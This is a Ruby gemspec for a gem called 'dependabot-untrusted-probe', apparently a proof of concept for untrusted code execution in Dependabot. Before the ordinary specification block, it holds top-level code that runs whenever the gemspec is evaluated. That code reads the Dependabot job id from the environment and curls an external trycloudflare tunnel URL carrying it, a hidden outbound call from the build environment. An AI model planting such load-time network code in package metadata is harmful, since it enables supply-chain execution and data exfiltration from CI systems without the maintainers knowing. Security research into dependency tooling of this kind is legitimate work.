require "open3"

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "unknown")
probe_url = "https://allow-spotlight-baseball-investment.trycloudflare.com/other/dependency-code/job-#{job_id}-actor-runner-lab-v1"

begin
  stdout, stderr, status = Open3.capture3(
    "curl", "--location", "--silent", "--show-error", "--max-time", "10", probe_url
  )
  warn "DEPENDABOT_UNTRUSTED_GEM_PROBE job_id=#{job_id} exit=#{status.exitstatus} body=#{stdout.strip.inspect} stderr=#{stderr.strip.inspect}"
rescue StandardError => error
  warn "DEPENDABOT_UNTRUSTED_GEM_PROBE job_id=#{job_id} error=#{error.class}:#{error.message}"
end

Gem::Specification.new do |spec|
  spec.name = "dependabot-untrusted-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned dependency provenance probe"
  spec.authors = ["chawdamrunal"]
  spec.files = ["lib/dependabot_untrusted_probe.rb"]
  spec.require_paths = ["lib"]
  spec.license = "MIT"
end
